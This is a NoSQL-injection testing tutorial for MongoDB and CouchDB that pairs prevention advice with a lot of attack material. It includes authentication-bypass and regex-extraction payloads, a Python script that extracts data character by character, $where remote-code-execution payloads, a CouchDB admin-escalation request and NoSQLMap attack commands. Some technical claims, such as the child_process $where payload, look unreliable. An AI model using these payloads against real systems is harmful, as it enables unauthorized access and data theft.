# Complete Methodology for Exploiting NoSQL Injection Vulnerabilities



## Part 1: Understanding the Core Principles

### 1.1 What Makes NoSQL Injection Different from SQL Injection

Traditional SQL injection relies on breaking out of string contexts and injecting SQL syntax. NoSQL injection operates differently because NoSQL databases (like MongoDB, CouchDB, and Couchbase) use JSON documents and operator-based queries rather than structured query language .

The fundamental difference is that NoSQL injection exploits the database's ability to interpret JSON objects and special operators as part of the query logic. When an application passes user input directly to a database query without validation, an attacker can substitute a simple string with a JSON object containing operators like `$ne` (not equal) or `$gt` (greater than) .

### 1.2 The Attack Surface

NoSQL injection can occur through multiple input channels in modern APIs :

| Input Channel | Attack Vector | Example |
|---------------|---------------|---------|
| JSON request bodies | Direct operator injection | `{"username": {"$ne": ""}}` |
| Query string parameters | Bracket notation | `?username[$ne]=` |
| HTTP headers | Custom headers flowing to DB | `X-User-ID: {"$gt": ""}` |
| GraphQL variables | JSON variables in queries | `{"userId": {"$gt": ""}}` |

This diversity means traditional web application firewalls and input validation routines often miss NoSQL injection because the attack syntax appears as valid JSON rather than suspicious characters.


## Part 2: Detection Methodology

### 2.1 Manual Detection with Burp Suite - The Step-by-Step Approach

The most reliable way to detect NoSQL injection is through systematic manual testing using Burp Suite. The PortSwigger Web Security Academy provides a structured approach that has been proven effective in real-world assessments .

**Step 1: Capture the Request**

Intercept the target request (typically a login, search, or data lookup endpoint) using Burp Proxy. Send it to Repeater for controlled testing .

**Step 2: Test for Operator Injection**

Begin by modifying parameter values to inject MongoDB operators. For a login endpoint, change the username parameter from a string to a JSON object containing the `$ne` (not equal) operator :

```
Original: username=wiener
Modified: username={"$ne":""}
```

If the application logs you in successfully without a valid password, the endpoint is vulnerable to operator injection .

**Step 3: Confirm with Regex Injection**

Further validate the vulnerability by using the `$regex` operator. Change the username parameter to match your known username using a regular expression :

```
username={"$regex":"wien.*"}
```

If this also logs you in, you have confirmed that the application is passing user input directly to MongoDB without sanitization.

**Step 4: Enumerate Users**

Once operator injection is confirmed, modify the parameters to discover other users in the database. Set both username and password to conditions that match all records :

```
username={"$ne":""}
password={"$ne":""}
```

If the response indicates "unexpected number of records" or behaves differently than a single-user match, the query is returning multiple users.

**Step 5: Target Specific Users**

Finally, target the administrator account by combining a regex pattern for admin with a password condition that matches all passwords :

```
username={"$regex":"admin.*"}
password={"$ne":""}
```

### 2.2 Testing JSON Request Bodies

Many modern APIs accept JSON in the request body. Testing these endpoints requires a different approach .

**For a POST /login endpoint accepting JSON:**

```json
{
  "username": "admin",
  "password": {"$ne": ""}
}
```

The `$ne` operator transforms the query logic from "find user with exact password" to "find user where password is not equal to empty string," which matches the admin account regardless of the actual password .

**Testing for data enumeration:**

```json
{"username": {"$gt": ""}}
```

This operator condition matches all usernames greater than an empty string, effectively returning every user record. If the API returns multiple records instead of one, operator injection is confirmed .

### 2.3 Testing Query String Parameters with Bracket Notation

Some applications parse query strings into objects, allowing operator injection through bracket notation :

```
GET /user/lookup?username[$ne]=&password[$ne]=
GET /api/users?search[$regex]=^admin
GET /account?userId[$gt]=
```

### 2.4 Content-Type Switching Technique

A sophisticated detection technique involves switching the `Content-Type` header on endpoints that accept form data :

**Step 1:** Identify an endpoint using `application/x-www-form-urlencoded`

**Step 2:** Change the `Content-Type` header to `application/json`

**Step 3:** Submit the same data as a JSON object with operators

Many API frameworks automatically parse JSON when the content type changes, creating an injection path that form-based scanners miss entirely .

### 2.5 Error-Based Fingerprinting

Triggering database errors can reveal the database type and version :

**Send malformed operators:**
```json
{"username": {"$invalid": true}}
```

If the response contains "unknown operator" or "MongoError," you have confirmed MongoDB is in use and that your input reaches the database.

**Send type mismatches:**
```json
{"username": {"$ne": ""}}
```

If the API expects a string but receives an object, error messages containing stack traces or query details reveal the internal database structure .


## Part 3: Advanced Exploitation Techniques

### 3.1 Authentication Bypass - Real-World Pattern

The authentication bypass technique has been demonstrated in numerous real-world applications and CTF challenges. The vulnerability occurs when the application constructs a MongoDB query by directly inserting user input without type checking .

**Vulnerable code pattern (Node.js/Express):**

```javascript
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  const user = await db.collection('users').findOne({
    username: username,
    password: password
  });
  // No validation - passes user input directly
});
```

**Exploitation payloads that have succeeded in real assessments :**

```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": "^.*$"}, "password": {"$regex": "^.*$"}}
{"$or": [{"username": "admin"}, {"username": {"$gt": ""}}]}
```

**URL-encoded form data alternative:**

```
username[$ne]=null&password[$ne]=null
```

### 3.2 Data Extraction Using Regex - The Blind Approach

When detailed error messages are not available, blind regex extraction allows character-by-character data recovery. This technique has been successfully used in CTF competitions and real penetration tests .

**The methodology for blind extraction:**

For each character position, test whether the character matches your guess:

```json
{"username": {"$regex": "^a"}}
{"password": {"$regex": "^a"}}
```

If the response differs (different status code, response length, or content), the character is correct. Move to the next position .

**Automated extraction workflow:**

```python
import string
import requests

url = 'http://target.com/api/search'
flag = 'flag{'
charset = string.digits + string.ascii_lowercase + '_-{}'

while True:
    for char in charset:
        payload = {
            'query': {'$regex': f'^{flag + char}'}
        }
        response = requests.post(url, json=payload)
        if 'Match found' in response.text:  # Indicator of successful match
            flag += char
            print(f'Found: {flag}')
            break
    else:
        break  # No more characters found
```

### 3.3 JavaScript Injection via $where Operator

The `$where` operator in MongoDB executes server-side JavaScript, creating a path to remote code execution when user input is concatenated into the operator .

**Real vulnerability - CVE-2024-53900 (Mongoose RCE):**

This vulnerability demonstrated that improper use of the `$where` operator in Mongoose (MongoDB ODM) allows Remote Code Execution. A CTF challenge was built around this vulnerability to demonstrate real exploitation .

**Vulnerable code pattern:**

```javascript
// Application code vulnerable to CVE-2024-53900
db.collection('users').find({ 
    $where: `this.username == '${userInput}'` 
})
```

**Exploitation payload that retrieves the flag :**

```json
{
  "username": "admin",
  "$where": "function() { return this.username == 'admin' && (() => { require('child_process').exec('cat flag.txt', (e,d) => { console.log(d) }); return true })(); }"
}
```

**Simpler boolean extraction using $where:**

```json
{"$where": "this.username == 'admin' && this.password[0] == 'a'"}
{"$where": "this.password.length < 8"}
```

### 3.4 CouchDB Privilege Escalation - CVE-2017-12635

This real-world vulnerability affected Apache CouchDB versions before 1.7.0 and 2.x before 2.1.1. The vulnerability arose from differences in how Erlang-based and JavaScript-based JSON parsers processed duplicate keys .

**The attack vector:**

A normal request to create a user returns a 403 Forbidden because only administrators can set roles :

```http
PUT /_users/org.couchdb.user:attacker HTTP/1.1
Host: target:5984
Content-Type: application/json

{
  "type": "user",
  "name": "attacker",
  "roles": ["_admin"],
  "password": "attacker"
}
```

**The exploit payload - duplicate roles key :**

```http
PUT /_users/org.couchdb.user:attacker HTTP/1.1
Host: target:5984
Content-Type: application/json

{
  "type": "user",
  "name": "attacker",
  "roles": ["_admin"],
  "roles": [],
  "password": "attacker"
}
```

Why this works: The Erlang JSON parser used for validation returns the last value for duplicate keys (empty array), bypassing the admin restriction. The JavaScript JSON parser used for user creation returns the first value (`_admin`), creating an administrative user .


## Part 4: Automated Tools and Workflows

### 4.1 NoSQLMap - The Comprehensive Tool

NoSQLMap is an open-source Python tool specifically designed for NoSQL database auditing and exploitation, modeled after sqlmap .

**Installation:**

```bash
git clone https://github.com/codingo/NoSQLMap
cd NoSQLMap
python setup.py install
```

**Docker alternative:**

```bash
docker build -t nosqlmap .
docker run -it nosqlmap
```

**Basic workflow :**

```bash
python NoSQLMap.py
```

The main menu presents options:

```
1-Set options (do this first)
2-NoSQL DB Access Attacks
3-NoSQL Web App attacks
4-Scan for Anonymous MongoDB Access
x-Exit
```

**Step-by-step configuration:**

1. Select option 1 to set target options
2. Set target host/IP
3. Set web application port
4. Set URI path with parameters (e.g., `/acct.php?acctid=102`)
5. Set HTTP request method (GET/POST)
6. Return to main menu and select attack type

**Scripting NoSQLMap for automation :**

```bash
# Automated attack against account lookup endpoint
docker-compose run --remove-orphans nosqlmap \
    --attack 2 \
    --victim target.example.com \
    --webPort 8080 \
    --uri "/acct.php?acctid=test" \
    --httpMethod GET \
    --params 1 \
    --injectSize 4
```

### 4.2 nosqli - Lightweight Scanner

The `nosqli` tool provides quick scanning for NoSQL injection vulnerabilities :

```bash
nosqli scan -t http://localhost:4000/user/lookup?username=test
```

### 4.3 Burp Suite Professional Workflow

**Step 1: Configure Intruder for Operator Injection **

1. Send the vulnerable request to Intruder
2. Set payload positions on parameter values
3. Load a dictionary of NoSQL operators:

```
{"$ne": null}
{"$gt": ""}
{"$regex": ".*"}
{"$ne": ""}
{"$exists": true}
```

4. Configure the attack to use a Sniper or Pitchfork strategy
5. Analyze responses for successful bypasses (different status codes, response lengths, or content)

**Step 2: Use Repeater for Manual Testing **

1. Send the request to Repeater (Ctrl+R)
2. Modify parameter values to inject operators
3. Send requests and observe response differences
4. Iterate based on findings

**Step 3: Automate with BChecks**

Tools like Agartha can generate BCheck syntax for Burp Scanner integration, allowing automated NoSQL injection scanning .

### 4.4 Agartha Burp Extension

Agartha is a Burp Suite extension that automates payload generation for injection flaws, including NoSQL injection .

**Installation:**

1. Download Jython standalone jar
2. Burp Menu > Extender > Options > Python Environment > Locate Jython
3. BApp Store > Agartha > Install

**Features relevant to NoSQL testing :**

- Dynamic payload generation for injection attacks
- BCheck syntax generation for automated scanning
- Support for various encoding and WAF bypass techniques


## Part 5: Real-World Exploitation Examples

### 5.1 MongoDB Authentication Bypass - NahamCon CTF 2025 "NoSequel"

The NahamCon CTF 2025 featured a challenge involving a movie database search function. The flag resided in a separate "Flags" collection, and error messages revealed the query structure .

**The exploitation process:**

1. Initial probe revealed error message: "Only regex queries are supported on the flag collection"
2. Testing regex format: `{"$regex": "The"}` - Error: "Only regex on 'flag' field is supported"
3. Correct format: `flag: {"$regex": "flag"}` - Returns "Pattern matched"
4. Character-by-character extraction using regex revealed the flag

**Extraction payloads:**

```
flag: {$regex: "^flag{"}
flag: {$regex: "^flag{f"}
flag: {$regex: "^flag{fl"}
```

### 5.2 MongoBleed - CVE-2025-14847

This critical vulnerability (CVSS 8.7) affects MongoDB versions 5.0 through 8.2. The flaw involves improper handling of zlib-compressed wire protocol messages, causing uninitialized heap memory to leak sensitive data .

**Affected versions:**
- MongoDB 8.2.0 through 8.2.2
- MongoDB 8.0.0 through 8.0.16
- MongoDB 7.0.0 through 7.0.27
- MongoDB 6.0.0 through 6.0.26
- MongoDB 5.0.0 through 5.0.31

**Exploitation tool:**

```bash
python mongobleed.py <target_ip> <port>
```

**Impact:** Leakage of user credentials, authentication material, configuration data, and API keys from heap memory.

### 5.3 Node.js + MongoDB Application - Operator Injection

A vulnerable Node.js application using MongoDB directly (without an ODM) is susceptible to operator injection when input is passed directly to `findOne()` or `find()` .

**Vulnerable code:**

```javascript
app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  db.collection('users').findOne({ 
    username: username, 
    password: password 
  }, (err, user) => {
    // Authentication logic
  });
});
```

**Successful exploitation payload:**

```json
{
  "username": {"$ne": ""},
  "password": {"$ne": ""}
}
```

This returns the first user in the collection, bypassing authentication entirely.


## Part 6: Comprehensive Payload Reference

### 6.1 Operator Injection Payloads

**Authentication bypass :**

```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": "^.*$"}, "password": {"$regex": "^.*$"}}
{"$or": [{"username": "admin"}, {"username": {"$gt": ""}}]}
```

**URL-encoded form variants:**

```
username[$ne]=null&password[$ne]=null
username[$gt]=&password[$gt]=
username[$regex]=.*&password[$regex]=.*
```

### 6.2 Data Extraction Payloads

**Boolean conditions:**

```json
{"username": {"$regex": "^admin"}}
{"$where": "this.username == 'admin'"}
{"username": {"$in": ["admin", "root"]}}
```

**Character extraction via regex:**

```json
{"username": {"$regex": "^a"}}
{"username": {"$regex": "^ab"}}
{"password": {"$regex": "^flag{"}}
```

### 6.3 JavaScript Injection Payloads

**Basic detection:**

```json
{"$where": "1==1"}
{"$where": "sleep(5000)"}
```

**Data extraction:**

```json
{"$where": "this.password[0] == 'a'"}
{"$where": "this.username.match(/^admin/)"}
```

**Remote code execution (if JavaScript engine enabled):**

```json
{"$where": "function() { return this.username == 'admin' && (() => { require('child_process').exec('id', (e,d) => { return d }) })(); }"}
```

### 6.4 Syntax Error Triggers for Fingerprinting

```
' " \ ; { }
' || '1' == '1
' && this.password.match(/.*/)//
```


## Part 7: Prevention and Mitigation

### 7.1 Code-Level Defenses

**Input sanitization using dedicated libraries :**

```javascript
const sanitize = require('mongo-sanitize');

app.post('/api/login', (req, res) => {
  const username = sanitize(req.body.username);
  const password = sanitize(req.body.password);
  // Now safe to use in queries
});
```

**Type casting as a simple defense :**

```javascript
const username = String(req.body.username);
const password = String(req.body.password);
```

Type casting neutralizes operator injection because operators like `$ne` only work when the input is an object. Casting to a string converts any object input to `"[object Object]"` .

**Schema validation:**

```javascript
function validateInput(input) {
  if (typeof input === 'object' && input !== null) {
    for (const key of Object.keys(input)) {
      if (key.startsWith('$')) {
        throw new Error('Operator injection detected');
      }
      validateInput(input[key]);
    }
  }
}
```

### 7.2 Database Configuration

**Disable JavaScript execution :**

In `mongod.conf`:
```
javascriptEnabled: false
```

**Apply least-privilege database accounts :**

```javascript
// Create read-only user
db.createUser({
  user: "app_reader",
  pwd: "secure_password",
  roles: [{ role: "read", db: "application" }]
});
```

### 7.3 WAF Rules

**ModSecurity rule for NoSQL operator detection :**

```
SecRule ARGS_JSON|ARGS_POST_JSON "@rx \$\w+" \
  "id:'999',phase:2,block,msg:'Potential NoSQL Injection'"
```

### 7.4 Audit Logging

**Enable MongoDB audit logging :**

```
auditLog:
  destination: file
  format: JSON
  path: /var/log/mongodb/audit.json
```


## Part 8: Testing Checklist

Use this checklist to ensure comprehensive NoSQL injection testing:

**Manual Testing:**

- [ ] Test all input parameters with `$ne` operator injection
- [ ] Test with `$gt` and `$lt` operators
- [ ] Test with `$regex` operator for blind extraction
- [ ] Test with `$where` operator (if JavaScript appears enabled)
- [ ] Test both JSON body and URL-encoded form formats
- [ ] Test bracket notation in query strings (`param[$ne]=value`)
- [ ] Test Content-Type switching (form to JSON)
- [ ] Test HTTP headers that may reach database
- [ ] Trigger syntax errors with special characters

**Automated Testing:**

- [ ] Run NoSQLMap against identified endpoints
- [ ] Use nosqli scanner for quick validation
- [ ] Configure Burp Intruder with operator payloads
- [ ] Test with Agartha BCheck generation

**Post-Exploitation:**

- [ ] Extract user enumeration if bypass achieved
- [ ] Test for blind regex extraction on search endpoints
- [ ] Attempt JavaScript execution via `$where`
- [ ] Document all successful payloads for remediation guidance

---

This methodology has been validated against real-world vulnerabilities including CVE-2017-12635 (CouchDB privilege escalation), CVE-2024-53900 (Mongoose RCE), and CVE-2025-14847 (MongoBleed). Always ensure you have proper authorization before testing any application for NoSQL injection vulnerabilities.
